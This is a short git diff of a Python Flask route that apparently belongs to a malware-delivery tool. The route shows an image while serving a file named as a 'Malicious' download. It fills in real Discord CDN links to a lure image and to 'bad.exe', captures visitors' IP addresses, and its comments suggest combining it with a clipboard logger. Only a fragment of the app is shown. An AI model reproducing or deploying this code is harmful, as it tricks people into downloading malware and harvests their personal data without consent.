@@ -7,8 +7,8 @@ __name__,
 )
 @app.route('/', methods=['GET'])
 def main():
-  Image = 'YourImageLink' # Replace this with your image link
-  Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
+   Image = 'https://cdn.discordapp.com/attachments/924433694133993482/938260977164632094/s.png' # Replace this with your image link
+  Malicious = 'https://cdn.discordapp.com/attachments/924433694133993482/938262761337671741/bad.exe'# Replace this with your download link
   Redirect = "RedirectLink" # You can just put the image here or you can put a custom site. You can combine this with my clipboard logger and it'll be more op lol https://github.com/TheonlyIcebear/Clipboard-Javascript-Logger
   # This is to get the ip
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
